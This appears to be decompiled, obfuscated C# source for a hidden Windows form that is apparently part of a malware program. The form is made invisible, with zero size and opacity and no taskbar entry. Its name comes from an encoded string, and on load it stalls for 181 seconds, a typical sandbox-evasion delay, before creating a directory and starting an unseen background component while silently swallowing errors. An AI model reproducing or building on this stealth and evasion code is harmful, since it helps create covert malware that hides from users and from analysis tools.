using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

public sealed class GForm0 : Form
{
	private GClass2 gclass2_0 = new GClass2();

	private IContainer icontainer_0 = null;

	public GForm0()
	{
		method_0();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void GForm0_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			Thread.Sleep(100);
			gclass2_0.method_7();
			Thread.Sleep(100);
		}
		catch
		{
		}
	}

	private void GForm0_Load(object sender, EventArgs e)
	{
		_ = DateTime.Now;
		DateTime dateTime = DateTime.Now.AddSeconds(181.0);
		while (DateTime.Now < dateTime)
		{
		}
		try
		{
			((Form)this).set_ShowInTaskbar(false);
			((Form)this).set_FormBorderStyle((FormBorderStyle)6);
			if (!Directory.Exists(Class6.smethod_2()))
			{
				Directory.CreateDirectory(Class6.smethod_2());
			}
			gclass2_0.gform0_0 = this;
			Thread.Sleep(100);
			gclass2_0.method_0();
			Thread.Sleep(100);
		}
		catch
		{
		}
	}

	private void method_0()
	{
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name(Class11.smethod_0(-2094343282));
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text(Class11.smethod_0(-2094343282));
		((Form)this).add_FormClosing(new FormClosingEventHandler(GForm0_FormClosing));
		((Form)this).add_Load((EventHandler)GForm0_Load);
		((Control)this).ResumeLayout(false);
	}
}
